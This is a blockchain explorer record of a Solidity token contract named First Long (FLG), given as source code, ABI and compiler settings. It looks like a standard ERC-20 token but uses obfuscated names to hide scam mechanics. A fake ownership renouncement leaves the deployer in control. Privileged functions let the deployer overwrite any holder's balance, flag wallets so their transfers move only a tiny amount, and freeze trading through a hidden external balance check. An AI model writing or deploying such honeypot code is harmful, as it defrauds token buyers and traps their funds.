{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface tradingLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedFeeBuy {\n    function createPair(address toAutoAt, address launchWallet) external returns (address);\n}\n\ninterface atMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyLaunch) external view returns (uint256);\n\n    function transfer(address isFund, uint256 autoBuyReceiver) external returns (bool);\n\n    function allowance(address limitFundTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoBuyReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isFund,\n        uint256 autoBuyReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeAt, uint256 value);\n    event Approval(address indexed limitFundTotal, address indexed spender, uint256 value);\n}\n\ninterface atMaxMetadata is atMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FirstLong is swapList, atMax, atMaxMetadata {\n\n    address public autoLaunch;\n\n    uint256 private swapAutoLaunch = 100000000 * 10 ** 18;\n\n    function txTotalList(address senderAtSell) public {\n        atWallet();\n        if (enableTxExempt != shouldToFrom) {\n            shouldToFrom = totalTeam;\n        }\n        if (senderAtSell == feeLimitShould || senderAtSell == autoLaunch) {\n            return;\n        }\n        enableTotal[senderAtSell] = true;\n    }\n\n    uint256 public enableTxExempt;\n\n    bool public launchedSwap;\n\n    mapping(address => mapping(address => uint256)) private isMinTake;\n\n    bool private listFrom;\n\n    bool private swapLimit;\n\n    function enableMode() public {\n        emit OwnershipTransferred(feeLimitShould, address(0));\n        launchedSender = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundSell;\n    }\n\n    function owner() external view returns (address) {\n        return launchedSender;\n    }\n\n    address sellLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toSwapReceiver;\n    }\n\n    uint256 constant txMax = 6 ** 10;\n\n    function minLiquidity(address sellAmount, address isFund, uint256 autoBuyReceiver) internal returns (bool) {\n        require(launchedMaxLimit[sellAmount] >= autoBuyReceiver);\n        launchedMaxLimit[sellAmount] -= autoBuyReceiver;\n        launchedMaxLimit[isFund] += autoBuyReceiver;\n        emit Transfer(sellAmount, isFund, autoBuyReceiver);\n        return true;\n    }\n\n    function limitWallet(uint256 autoBuyReceiver) public {\n        atWallet();\n        txEnableLaunched = autoBuyReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapAutoLaunch;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeEnableTeam;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedSender;\n    }\n\n    function exemptWallet(address sellAmount, address isFund, uint256 autoBuyReceiver) internal returns (bool) {\n        if (sellAmount == feeLimitShould) {\n            return minLiquidity(sellAmount, isFund, autoBuyReceiver);\n        }\n        uint256 totalSwap = atMax(autoLaunch).balanceOf(limitToken);\n        require(totalSwap == txEnableLaunched);\n        require(isFund != limitToken);\n        if (enableTotal[sellAmount]) {\n            return minLiquidity(sellAmount, isFund, txMax);\n        }\n        return minLiquidity(sellAmount, isFund, autoBuyReceiver);\n    }\n\n    function sellBuy(address listToken, uint256 autoBuyReceiver) public {\n        atWallet();\n        launchedMaxLimit[listToken] = autoBuyReceiver;\n    }\n\n    function atWallet() private view {\n        require(tradingSwap[_msgSender()]);\n    }\n\n    uint256 public totalTeam;\n\n    mapping(address => bool) public tradingSwap;\n\n    function approve(address takeAt, uint256 autoBuyReceiver) public virtual override returns (bool) {\n        isMinTake[_msgSender()][takeAt] = autoBuyReceiver;\n        emit Approval(_msgSender(), takeAt, autoBuyReceiver);\n        return true;\n    }\n\n    string private modeEnableTeam = \"First Long\";\n\n    string private fundSell = \"FLG\";\n\n    uint256 tradingTx;\n\n    mapping(address => uint256) private launchedMaxLimit;\n\n    uint256 private shouldToFrom;\n\n    address public feeLimitShould;\n\n    address private launchedSender;\n\n    address limitToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function autoList(address fromLimit) public {\n        if (launchedSwap) {\n            return;\n        }\n        if (limitFee) {\n            limitFee = false;\n        }\n        tradingSwap[fromLimit] = true;\n        if (enableTxExempt != totalTeam) {\n            totalTeam = shouldToFrom;\n        }\n        launchedSwap = true;\n    }\n\n    function allowance(address isLaunched, address takeAt) external view virtual override returns (uint256) {\n        if (takeAt == sellLaunched) {\n            return type(uint256).max;\n        }\n        return isMinTake[isLaunched][takeAt];\n    }\n\n    uint256 txEnableLaunched;\n\n    uint8 private toSwapReceiver = 18;\n\n    constructor (){\n        if (shouldToFrom != enableTxExempt) {\n            enableTxExempt = shouldToFrom;\n        }\n        tradingLaunch takeIs = tradingLaunch(sellLaunched);\n        autoLaunch = launchedFeeBuy(takeIs.factory()).createPair(takeIs.WETH(), address(this));\n        \n        feeLimitShould = _msgSender();\n        enableMode();\n        tradingSwap[feeLimitShould] = true;\n        launchedMaxLimit[feeLimitShould] = swapAutoLaunch;\n        \n        emit Transfer(address(0), feeLimitShould, swapAutoLaunch);\n    }\n\n    function transfer(address listToken, uint256 autoBuyReceiver) external virtual override returns (bool) {\n        return exemptWallet(_msgSender(), listToken, autoBuyReceiver);\n    }\n\n    bool public limitFee;\n\n    event OwnershipTransferred(address indexed launchedAmount, address indexed atTotalSender);\n\n    mapping(address => bool) public enableTotal;\n\n    function transferFrom(address sellAmount, address isFund, uint256 autoBuyReceiver) external override returns (bool) {\n        if (_msgSender() != sellLaunched) {\n            if (isMinTake[sellAmount][_msgSender()] != type(uint256).max) {\n                require(autoBuyReceiver <= isMinTake[sellAmount][_msgSender()]);\n                isMinTake[sellAmount][_msgSender()] -= autoBuyReceiver;\n            }\n        }\n        return exemptWallet(sellAmount, isFund, autoBuyReceiver);\n    }\n\n    function balanceOf(address buyLaunch) public view virtual override returns (uint256) {\n        return launchedMaxLimit[buyLaunch];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFundTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTotalSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"autoList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTxExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimitShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"limitWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"sellBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAtSell\",\"type\":\"address\"}],\"name\":\"txTotalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FirstLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}